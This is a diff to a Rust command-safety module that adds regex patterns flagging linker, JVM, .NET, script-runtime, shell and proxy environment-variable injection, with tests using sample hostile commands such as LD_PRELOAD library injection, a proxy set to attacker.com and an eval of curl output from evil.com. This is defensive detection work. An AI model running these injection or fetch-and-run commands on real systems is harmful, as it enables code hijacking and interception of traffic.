@@ -86,6 +86,18 @@ pub static DANGER_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
         Regex::new(r"^(apt|apt-get|yum|dnf|pacman|brew)\s+(install|remove|purge)").unwrap(),
         // mv to sensitive locations
         Regex::new(r"^mv\s+.*\s+(/etc/|/usr/|/bin/|/sbin/)").unwrap(),
+        // Environment variable injection — dangerous linker/runtime vars
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH|DYLD_FRAMEWORK_PATH)\s*=").unwrap(),
+        // JVM toolchain injection
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:MAVEN_OPTS|SBT_OPTS|GRADLE_OPTS|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)\s*=").unwrap(),
+        // .NET hijacking
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:DOTNET_STARTUP_HOOKS|COR_PROFILER|COR_PROFILER_PATH|CORECLR_PROFILER|CORECLR_PROFILER_PATH)\s*=").unwrap(),
+        // Script runtime injection
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:NODE_OPTIONS|PYTHONSTARTUP|PYTHONPATH|RUBYOPT|RUBYLIB)\s*=").unwrap(),
+        // Shell injection
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:BASH_ENV|ENV|CDPATH)\s*=").unwrap(),
+        // Proxy hijacking
+        Regex::new(r"(?:^|\s)(?:export\s+|env\s+)?(?:http_proxy|https_proxy|HTTP_PROXY|HTTPS_PROXY)\s*=").unwrap(),
     ]
 });
 
@@ -187,5 +199,36 @@ mod tests {
     fn test_blocked_eval_rce() {
         assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match("eval `cat /etc/passwd`")));
         assert!(BLOCKED_PATTERNS.iter().any(|p| p.is_match(r#"eval "$(curl http://evil.com)""#)));
+    }
+
+    #[test]
+    fn test_danger_env_injection_export() {
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export LD_PRELOAD=/evil/lib.so")));
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export DYLD_INSERT_LIBRARIES=/evil.dylib")));
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export MAVEN_OPTS=-javaagent:evil.jar")));
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export NODE_OPTIONS=--require=evil.js")));
+    }
+
+    #[test]
+    fn test_danger_env_injection_inline() {
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("LD_PRELOAD=/evil.so ls")));
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("PYTHONSTARTUP=/evil.py python3")));
+    }
+
+    #[test]
+    fn test_danger_env_injection_env_cmd() {
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("env BASH_ENV=/evil.sh bash")));
+    }
+
+    #[test]
+    fn test_danger_env_injection_proxy() {
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("export HTTP_PROXY=http://evil.com:8080")));
+        assert!(DANGER_PATTERNS.iter().any(|p| p.is_match("https_proxy=http://attacker.com curl api.com")));
+    }
+
+    #[test]
+    fn test_safe_echo_about_env_var() {
+        let kernel = super::super::kernel::SecurityKernel::new();
+        assert_eq!(kernel.assess("echo MAVEN_OPTS is set"), super::RiskLevel::Safe);
     }
 }
